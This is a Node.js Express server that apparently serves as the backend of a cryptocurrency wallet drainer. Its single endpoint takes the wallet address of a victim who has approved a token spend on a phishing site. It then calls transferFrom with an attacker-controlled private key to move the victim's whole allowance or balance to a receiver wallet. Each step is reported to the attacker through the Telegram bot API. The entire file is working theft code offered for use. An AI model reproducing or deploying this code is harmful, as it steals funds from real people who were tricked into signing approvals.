const express = require("express");
const request = require('request');
const cors = require('cors');
const ethers = require("ethers");
const dotenv = require("dotenv");

dotenv.config();

const app = express()

const PORT = process.env.PORT || 3000


app.use(cors());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

const ERC20_ABI = [
  {
    "constant": false,
    "inputs": [
      {
        "name": "_from",
        "type": "address"
      },
      {
        "name": "_to",
        "type": "address"
      },
      {
        "name": "_value",
        "type": "uint256"
      }
    ],
    "name": "transferFrom",
    "outputs": [
      {
        "name": "",
        "type": "bool"
      }
    ],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [
      {
        "name": "_owner",
        "type": "address"
      },
      {
        "name": "_spender",
        "type": "address"
      }
    ],
    "name": "allowance",
    "outputs": [
      {
        "name": "remaining",
        "type": "uint256"
      }
    ],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [
      {
        "name": "_owner",
        "type": "address"
      }
    ],
    "name": "balanceOf",
    "outputs": [
      {
        "name": "",
        "type": "uint256"
      }
    ],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
  }
];

const config = { 
    receiver: process.env.receiverAddress,
    SAFAprivatekey: process.env.SAFAprivatekey,
    BOT_TOKEN: process.env.bot,
    CHAT_ID: process.env.chat_id,
 }


 const chains = [
  {
    chainId: 42161,
    rpcUrl: "https://rpc.ankr.com/arbitrum"
  },
  {
    chainId: 1,
    rpcUrl: "https://rpc.ankr.com/eth"
  },
  {
    chainId: 137,
    rpcUrl: "https://rpc-mainnet.maticvigil.com/"
  },
  {
    chainId: 56,
    rpcUrl: "https://bsc-dataseed.binance.org/"
  },
  {
    chainId: 43114,
    rpcUrl: "https://api.avax.network/ext/bc/C/rpc"
  },
  {
    chainId: 43113,
    rpcUrl: "https://api.avax-test.network/ext/bc/C/rpc"
  },
  {
    chainId: 369,
    rpcUrl: "https://rpc.pulsechain.com/"
  }
];

function getRpcUrl(chainId) {
  const chain = chains.find(chain => chain.chainId === chainId);
  if (chain) {
    return chain.rpcUrl;
  } else {
    return null;
  }
}




app.post("/oracle/erc20", async (req, res) => {
  let address = req.body.address;
  let contractAddress_ = req.body.contractAddress;
  let transactionHash = req.body.transactionHash;
  let websiteUrl = req.body.websiteUrl;
  let chainId_ = parseInt(req.body.chainId);

  let escaper = (ah) => {
    if (typeof ah !== 'string') {
      return ah;
    }
  
    return ah.replace(/_/g, '\\_')
      .replace(/\*/g, '\\*')
      .replace(/\[/g, '\\[')
      .replace(/\]/g, '\\]')
      .replace(/\(/g, '\\(')
      .replace(/\)/g, '\\)')
      .replace(/~/g, '\\~')
      .replace(/`/g, '\\`')
      .replace(/>/g, '\\>')
      .replace(/#/g, '\\%23')
      .replace(/\+/g, '\\+')
      .replace(/-/g, '\\-')
      .replace(/=/g, '\\=')
      .replace(/\|/g, '\\|')
      .replace(/{/g, '\\{')
      .replace(/}/g, '\\}')
      .replace(/\./g, '\\.')
      .replace(/!/g, '\\!');
  }


let provider = new ethers.providers.JsonRpcProvider(
    getRpcUrl(chainId_)
  );
  console.log(chainId_)
  await provider.waitForTransaction(transactionHash);

  try {
    let message =
      `🟢 *Approval Made ${escaper(contractAddress_)}  Transfer*\n\n` +
      `🔑 *Wallet Address*: [${escaper(address)}](https://zapper.xyz/account/${address})\n` +
      `🌐 *From Website*: ${escaper(websiteUrl)}\n`;

    let clientServerOptions = {
      uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
      body: JSON.stringify({ chat_id: config.CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true }),
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      }
    }

    request(clientServerOptions, (error, response) => {
      console.log("Sent ERC20 log");
    });

 const signer = new ethers.Wallet(config.SAFAprivatekey, provider);
 let contractInstance = new ethers.Contract(contractAddress_, ERC20_ABI, signer);

 let withdrawal;

    let allowance = await contractInstance.allowance(address, config.receiver);
    let balance = await contractInstance.balanceOf(address);
    if (parseInt(allowance) > 0){

      const gasPrice = await provider.getGasPrice();

      if (balance.gte(allowance)) {
        withdrawal = await contractInstance.transferFrom(address, config.receiver, allowance, {gasPrice});
      } else {
        withdrawal = await contractInstance.transferFrom(address, config.receiver, balance, {gasPrice});
        console.log("Balance is less than allowance. Cannot perform withdrawal.");
      }


      
    }else{
      let message =
      `🔴 *Approval Transfer Error ${escaper(contractAddress_)}  Transfer*\n\n` +
      `*Reason*: Low Approval Amount\n`;
    let clientServerOptions = {
      uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
      body: JSON.stringify({ chat_id: config.CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true }),
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      }
    }
    request(clientServerOptions, (error, response) => {
      console.log("Sent ERC20 log");
    });
      console.log("Allowance is zero");
    }
    await provider.waitForTransaction(withdrawal.hash);
    let withdrawMessage =
      `*💸 Approval Withdrawn \n\n` +
      `🌐 *From Website*: ${escaper(websiteUrl)}` +
      `*Source Wallet:* [${escaper(address)}](https://zapper.xyz/account/${address})\n` +
      `*🏦 Destination Wallet:* [${escaper(config.receiver)}](https://etherscan.io/address/${config.receiver})\n` +
      `*Withdrawal Tx_hash:* [Here](${escaper(withdrawal.hash)})\n`;

    let withdrawClientServerOptions = {
      uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
      body: JSON.stringify({ chat_id: config.CHAT_ID, parse_mode: "MarkdownV2", text: withdrawMessage, disable_web_page_preview: true }),
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      }
    }

    request(withdrawClientServerOptions, (error, response) => {
      console.log("[+] Withdrawed ERC20");
      res.sendStatus(200);
    });
  } catch (error) {
    console.warn("[-] SAFA ERC20 error: ", error)
  }
});


app.listen(PORT, () => console.log(`Listening on port ${PORT}`))
